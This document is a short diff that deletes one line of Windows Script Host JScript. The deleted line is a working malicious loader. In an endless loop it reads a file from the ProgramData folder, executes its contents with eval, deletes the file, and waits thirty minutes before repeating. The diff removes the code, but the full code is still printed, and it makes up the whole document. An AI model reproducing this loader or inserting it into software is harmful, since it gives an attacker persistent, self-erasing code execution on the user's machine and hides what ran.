@@ -1,1 +1,0 @@
-while(true) { try{ var b_0 = WScript.CreateObject("WScript.Shell"); var b_1 = b_0.ExpandEnvironmentStrings("%programdata%\\1.txt"); var b_2 = WScript.CreateObject("Scripting.FileSystemObject").OpenTextFile(b_1,1); eval(b_2.ReadAll()); b_2.Close(); WScript.CreateObject("Scripting.FileSystemObject").DeleteFile(b_1); } catch(e){ } WScript.Sleep(30*60*1000); }
